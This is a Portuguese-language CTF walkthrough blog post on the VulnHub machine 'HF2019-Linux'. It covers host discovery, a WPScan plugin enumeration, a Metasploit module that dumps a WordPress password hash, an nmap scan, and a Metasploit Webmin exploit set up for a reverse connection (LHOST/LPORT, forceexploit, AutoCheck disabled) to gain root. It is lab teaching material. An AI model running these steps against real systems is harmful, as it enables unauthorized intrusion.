---
title: Nossa Primeira Maquina Virtual!
author:
date: 2023-06-24 23:10:00 -0300
categories: [Blogging]
tags: [blog]
---

# Maquina Em Questão

O alvo selecionado para este post é a máquina "HF2019-Linux". Para fazer o download, você pode acessar o link fornecido [aqui](https://www.vulnhub.com/entry/hacker-fest-2019,378/). Após o download, você pode importar a máquina virtual clicando duas vezes no arquivo baixado. Certifique-se de configurar a rede no modo bridge para garantir a conectividade adequada.

# Processo de identificação do endereço IP do alvo.

Vamos abrir o nosso terminal e executar o comando "sudo netdiscover". Em seguida, o terminal começará a testar diferentes tipos de endereços IP que desejamos. Procure por uma entrada com o "MAC Vendor / Hostname" da "PCS Systemtechnik GmbH" (lembre-se de que a senha de root padrão é "kali").

# Fase de reconhecimento

O WordPress é um sistema de gerenciamento de conteúdo (CMS) amplamente utilizado para criar e gerenciar sites e blogs. Ele fornece uma plataforma flexível e amigável que permite aos usuários criar e publicar conteúdo na web sem a necessidade de conhecimentos avançados em programação. Com o WordPress, é possível personalizar a aparência e funcionalidade do site, escolhendo temas e plugins adequados às necessidades individuais.Ao identificar a palavra "WordPress" repetidas vezes em um site, isso sugere fortemente que o site esteja utilizando essa plataforma para gerenciar seu conteúdo e funcionalidades.

<img src="/assets/img/wordpress1.png">

<img src="/assets/img/wordpress2.png">

<img src="/assets/img/wordpress3.png">

# wpscan

No nosso processo prático, utilizaremos uma ferramenta chamada "WPScan" que vem instalada por padrão no Kali Linux. Para executar essa ferramenta, abra o terminal e digite o comando "wpscan" seguido do parâmetro "--url" e o endereço IP do site que você deseja analisar. O comando completo ficará assim: "wpscan --url ip.do.site". Esse comando realizará a enumeração dos plugins do WordPress presentes no site e exibirá as informações no terminal, permitindo que você identifique quais plugins estão sendo utilizados no site em questão.

<img src="/assets/img/wpscan.png">

# Exploração do Plugin

Para explorar o plugin "wp-google-maps" e executá-lo utilizando a ferramenta "Metasploit" da suíte de ferramentas do Kali Linux, você pode seguir os seguintes passos:

1- Abra o terminal e digite o comando "sudo msfconsole" para iniciar o Metasploit com privilégios de administrador.

Isso abrirá a interface do Metasploit, onde você poderá realizar diversas ações de exploração e teste de segurança. Certifique-se de ter conhecimento adequado e seguir as práticas éticas ao usar essas ferramentas.

Lembrando que é importante agir dentro das leis e regulamentos aplicáveis, bem como obter a devida autorização antes de realizar qualquer teste de segurança em um sistema.
# metasploit

dentro do metasploit deveremos rodar o comando "search google maps" para o aplicativo fazer a busca dentro do banco de dados deles,apos encontrar o resultado dessa pesquisa devemos utilizar o comando "use 0"

<img src="/assets/img/msfconsole.png"> 

# configurando o seu exploit

Após utilizar o comando "use 0" para selecionar o exploit adequado no Metasploit, é recomendado executar o comando "options" para visualizar as opções de configuração disponíveis para esse exploit específico. No seu caso, você mencionou que só precisará alterar o valor do RHOSTS para o IP do seu alvo.

Para configurar o RHOSTS com o IP do alvo, você pode executar o comando "set RHOSTS ip.do.site". Certifique-se de substituir "ip.do.site" pelo endereço IP real do seu alvo.

Uma vez que o exploit esteja configurado corretamente, você pode executá-lo usando o comando "run" ou "exploit". Após a execução do exploit, você mencionou que obteve o seguinte resultado de saída: "Found webmaster $P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1 webmaster@none.local".

<img src="/assets/img/options.png"> 

# nmap

O Nmap é uma ferramenta de varredura de rede que permite identificar quais portas estão abertas ou fechadas em um alvo específico. Para utilizar essa ferramenta, é recomendado o uso do seguinte comando: "nmap -sV -p- -v ip.do.site". Vou explicar o significado de cada parâmetro:

    O parâmetro "-sV" indica que o Nmap realizará uma detecção de versão dos serviços que estão sendo executados em cada porta. Isso significa que ele fornecerá o nome e a versão dos serviços que estão rodando nas portas identificadas.

    O parâmetro "-p-" indica que o Nmap irá escanear todas as 65.535 portas possíveis do alvo. Isso significa que ele verificará todas as portas disponíveis para determinar se estão abertas ou fechadas.

    O parâmetro "-v" aumenta o nível de detalhamento das informações fornecidas pelo Nmap durante a varredura. Com esse parâmetro, você obterá informações mais detalhadas sobre o que o Nmap está fazendo durante o processo de varredura.

Ao executar o comando com esses parâmetros, o Nmap fará uma varredura completa nas portas do alvo especificado, identificando os serviços em execução em cada porta e fornecendo informações detalhadas sobre o processo no terminal.

<img src="https://nmap.org/images/nmap-logo-256x256.png">

# Lendo o "Output do Nmap"

Após executar o comando, você obteve o seguinte resultado de saída: identificou-se que a porta vulnerável é a porta número "10000", na qual está sendo executado o serviço "Webmin".

<img src="/assets/img/outputnmap.png">

# Webmin

o Webmin é um sistema de gerenciamento de arquivos e configuração de servidores. No seu caso, você identificou que o Webmin está executando uma versão vulnerável.

Para prosseguir, no Metasploit, você pode executar o comando "search webmin" para pesquisar por módulos relacionados ao Webmin. Em seguida, você pode utilizar o comando "use" seguido do número correspondente ao módulo desejado. Por exemplo, se o módulo desejado for o número 7, você pode executar o comando "use 7" para selecioná-lo.
<img src="/assets/img/webmin.png">

# Configurando o Exploit 

Para configurar o exploit no Metasploit, você pode seguir os passos a seguir:

1-    Execute o comando "options" para visualizar as opções disponíveis para configuração do exploit.

2-    Defina a opção "forceexploit" como "true" utilizando o comando "set forceexploit true". Isso permitirá a execução do exploit mesmo que a versão indicada não corresponda à versão detectada.

3-    Em seguida, defina o endereço IP do alvo utilizando o comando "set RHOSTS ip.do.alvo".

4-    Defina o endereço IP da sua máquina utilizando o comando "set LHOST ip.da.sua.maquina". Certifique-se de que a sua máquina esteja na mesma rede do alvo ou que haja conectividade adequada entre elas.

5-    Defina a porta local utilizando o comando "set LPORT 443". Essa será a porta utilizada para a conexão reversa.

6-  Execute o comando "set ssl true" para habilitar o uso de SSL na comunicação entre a sua máquina e o alvo. Isso pode ajudar a aumentar a segurança da conexão.

7-  Agora você está pronto para executar o exploit. Utilize o comando "exploit" ou "run" para iniciar a execução do exploit.

Se você receber a mensagem [*] Running automatic check ("set AutoCheck false" to disable), execute o comando "set AutoCheck false" para desabilitar a verificação automática e, em seguida, execute novamente o exploit.

# Fim

Parabéns por concluir o desafio da máquina virtual com sucesso! Agora, para verificar se você possui acesso root, você pode executar o comando "id" no terminal. Esse comando exibirá informações sobre o usuário atualmente autenticado, incluindo o ID do usuário (UID) e o ID do grupo (GID). Se você tiver acesso root, verá o UID e o GID correspondentes a "root", te vejo na proxima maquina amigo!

<img src="/assets/img/imagem final.jpg">
